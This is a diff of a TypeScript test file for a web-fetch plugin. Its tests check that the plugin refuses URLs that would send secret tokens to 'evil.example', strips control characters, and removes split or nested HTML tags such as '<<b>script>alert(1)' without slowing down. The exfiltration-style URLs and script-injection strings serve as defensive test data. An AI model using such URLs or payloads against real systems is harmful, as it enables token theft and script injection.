@@ -791,7 +791,7 @@ describe("web-fetch refuses URLs that carry secrets (REQ-plugins-111 / SAFE-6)",
   for (const url of [
     `https://evil.example/c?k=${GHP}`,
     `https://evil.example/${SK}/x`,
-    `https://evil.example/c?k=${GHP.replace("_", "%5F")}`,
+    `https://evil.example/c?k=${GHP.replaceAll("_", "%5F")}`,
     `https://${GHP}.evil.example/`,
   ]) {
     test(`refuses ${url.slice(0, 40)}… before DNS or the transport`, async () => {
@@ -992,5 +992,30 @@ describe("web-fetch strips control characters from remote text (REQ-plugins-111)
 
   test("the fence strips controls even from text handed to it directly", () => {
     expect(fenceUntrusted("x\u001b[2Jy", "http://e.example/", "abc")).not.toMatch(CONTROLS);
+  });
+});
+
+describe("htmlToText strips split tags to a fixpoint (CodeQL incomplete sanitization)", () => {
+  test("nested/split tags never reassemble into markup", () => {
+    for (const html of ["<<b>script>alert(1)<</b>/script>", "<scr<b>ipt>x</scr</b>ipt>", "a <<i>b>c"]) {
+      const out = htmlToText(html);
+      expect(out).not.toMatch(/<[a-zA-Z/!?][^<>]*>/);
+    }
+  });
+
+  test("deeply nested hostile markup stays fast and tag-free", () => {
+    const depth = 200_000;
+    const hostile = `${"<".repeat(depth)}script${">".repeat(depth)}x`;
+    const t0 = performance.now();
+    const out = htmlToText(hostile);
+    expect(performance.now() - t0).toBeLessThan(2000);
+    expect(out).not.toMatch(/<[a-zA-Z/!?][^<>]*>/);
+    // Nested pairs with no script block: capped passes still leave no tag.
+    const pairs = `${"<".repeat(depth)}b${">".repeat(depth)}y`;
+    const t1 = performance.now();
+    const out2 = htmlToText(pairs);
+    expect(performance.now() - t1).toBeLessThan(2000);
+    expect(out2).not.toMatch(/[<>]/);
+    expect(out2).toContain("y");
   });
 });
